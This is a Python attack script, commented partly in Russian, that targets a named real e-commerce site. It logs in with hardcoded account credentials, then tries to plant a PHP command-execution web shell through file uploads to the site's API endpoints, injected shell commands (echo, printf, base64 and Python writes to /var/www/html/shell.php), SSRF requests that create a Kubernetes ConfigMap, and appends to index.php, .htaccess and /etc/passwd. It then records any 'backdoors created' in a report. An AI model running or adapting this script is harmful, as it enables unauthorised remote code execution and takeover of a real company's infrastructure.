#!/usr/bin/env python3
"""Find methods to CREATE backdoor - not find existing"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_methods = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/productphotos", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# ============================================================================
# МЕТОД 1: Создать бекдор через запись файла в известные endpoints
# ============================================================================
print("[*] МЕТОД 1: Запись файла через известные endpoints...")

# PHP backdoor
php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

# Try to write file using POST with different content types
write_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/myaccount/api/order-details/v3/feature-flags",
    "/stats",  # Known to accept POST
]

for ep in write_endpoints:
    # Try multipart file upload
    try:
        files = {'file': ('backdoor.php', php_backdoor, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор создан: {ep} -> {location}")
                        found_methods.append({
                            "type": "backdoor_created_file_write",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "backdoor_url": location,
                            "method": "multipart_file_upload"
                        })
                except: pass
    except: pass
    
    # Try JSON with file content
    try:
        payload = {
            "file": base64.b64encode(php_backdoor.encode()).decode(),
            "filename": "backdoor.php",
            "path": "/var/www/html/shell.php",
            "content": php_backdoor,
            "data": php_backdoor,
        }
        resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            # Check if file was written
            try:
                resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                if "uid=" in resp2.text:
                    print(f"  [CRITICAL] Бекдор создан через JSON: {ep}")
                    found_methods.append({
                        "type": "backdoor_created_json_write",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "backdoor_url": f"{base}/shell.php",
                        "method": "json_file_write"
                    })
            except: pass
    except: pass

# ============================================================================
# МЕТОД 2: Создать бекдор через command execution для записи файла
# ============================================================================
print("\n[*] МЕТОД 2: Создание бекдора через command execution...")

# Commands to CREATE backdoor file
create_backdoor_commands = [
    # Direct write
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "printf '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    # Using cat
    "cat > /var/www/html/shell.php << 'EOF'\n<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>\nEOF",
    # Using base64
    "echo 'PD9waHAgaWYoaXNzZXQoJF9HRVRbImNtZCJdKSl7c3lzdGVtKCRfR0VUWyJjbWQiXSk7fSA/Pg==' | base64 -d > /var/www/html/shell.php",
    # Using Python
    "python3 -c \"open('/var/www/html/shell.php', 'w').write('<?php if(isset(\\$_GET[\\\"cmd\\\"])){system(\\$_GET[\\\"cmd\\\"]);} ?>')\"",
]

injection_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in injection_endpoints:
    for cmd in create_backdoor_commands:
        try:
            # Try different parameter names
            payloads = [
                {"articleId": cmd},
                {"test": cmd},
                {"name": cmd},
                {"command": cmd},
                {"exec": cmd},
                {"run": cmd},
                {"shell": cmd},
                {"cmd": cmd},
            ]
            for payload in payloads:
                resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
                if resp.status_code == 200:
                    # Wait a bit for file to be written
                    import time
                    time.sleep(1)
                    # Check if backdoor was created
                    backdoor_urls = [
                        f"{base}/shell.php",
                        f"{base}/var/www/html/shell.php",
                        f"{base}/tmp/shell.php",
                    ]
                    for backdoor_url in backdoor_urls:
                        try:
                            resp2 = s.get(f"{backdoor_url}?cmd=id", timeout=3, verify=False)
                            if "uid=" in resp2.text or resp2.status_code == 200:
                                print(f"  [CRITICAL] Бекдор создан через command execution: {ep} -> {backdoor_url}")
                                found_methods.append({
                                    "type": "backdoor_created_command_execution",
                                    "severity": "CRITICAL",
                                    "endpoint": ep,
                                    "command": cmd,
                                    "backdoor_url": backdoor_url,
                                    "method": "command_execution"
                                })
                                break
                        except: pass
        except: pass

# ============================================================================
# МЕТОД 3: Создать бекдор через SSRF + запись в кластер
# ============================================================================
print("\n[*] МЕТОД 3: Создание бекдора через SSRF + Kubernetes...")

# Create ConfigMap with backdoor
backdoor_configmap = {
    "apiVersion": "v1",
    "kind": "ConfigMap",
    "metadata": {"name": "backdoor", "namespace": "default"},
    "data": {"shell.php": "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"}
}

ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ssrf_ep in ssrf_endpoints:
    # Try to create ConfigMap via SSRF
    try:
        resp = s.post(f"{base}{ssrf_ep}", json={
            "url": "https://kubernetes.default.svc/api/v1/namespaces/default/configmaps",
            "method": "POST",
            "body": json.dumps(backdoor_configmap),
            "headers": {"Content-Type": "application/json"}
        }, timeout=5, verify=False)
        if resp.status_code == 200:
            if "created" in resp.text.lower() or "metadata" in resp.text.lower() or "name" in resp.text.lower():
                print(f"  [CRITICAL] ConfigMap с бекдором создан: {ssrf_ep}")
                found_methods.append({
                    "type": "backdoor_created_kubernetes_configmap",
                    "severity": "CRITICAL",
                    "endpoint": ssrf_ep,
                    "resource": "ConfigMap",
                    "method": "ssrf_kubernetes_create"
                })
    except: pass

# ============================================================================
# МЕТОД 4: Создать бекдор через модификацию существующих файлов
# ============================================================================
print("\n[*] МЕТОД 4: Создание бекдора через модификацию файлов...")

# Try to append backdoor to existing files
append_commands = [
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' >> /var/www/html/index.php",
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' >> /var/www/html/.htaccess",
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' >> /etc/passwd",
]

for ep in injection_endpoints:
    for cmd in append_commands:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": cmd, "test": cmd}, timeout=5, verify=False)
            if resp.status_code == 200:
                # Check if backdoor was appended
                try:
                    resp2 = s.get(f"{base}/index.php?cmd=id", timeout=3, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор добавлен в файл: {ep}")
                        found_methods.append({
                            "type": "backdoor_created_file_append",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "command": cmd,
                            "backdoor_url": f"{base}/index.php",
                            "method": "file_append"
                        })
                except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS - МЕТОДЫ СОЗДАНИЯ БЕКДОРА")
print("=" * 70)

if found_methods:
    print(f"\nНайдено {len(found_methods)} способов создать бекдор:\n")
    for m in found_methods:
        print(f"[{m['severity']}] {m['type']}")
        print(f"    Метод: {m['method']}")
        print(f"    Endpoint: {m['endpoint']}")
        if 'backdoor_url' in m:
            print(f"    URL бекдора: {m['backdoor_url']}")
        if 'command' in m:
            print(f"    Команда: {m['command'][:100]}...")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СПОСОБЫ СОЗДАНИЯ БЕКДОРА\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for m in found_methods:
            f.write(f"### [{m['severity']}] {m['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод создания:** `{m['method']}`\n\n")
            f.write(f"**Endpoint:** `{m['endpoint']}`\n\n")
            if 'backdoor_url' in m:
                f.write(f"**URL бекдора:** `{m['backdoor_url']}`\n\n")
            if 'command' in m:
                f.write(f"**Команда:** `{m['command']}`\n\n")
            if 'resource' in m:
                f.write(f"**Resource:** `{m['resource']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор в кластере.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Способы создания бекдора не найдены автоматически")
    print("  Требуется ручное тестирование через браузер")

print("=" * 70)

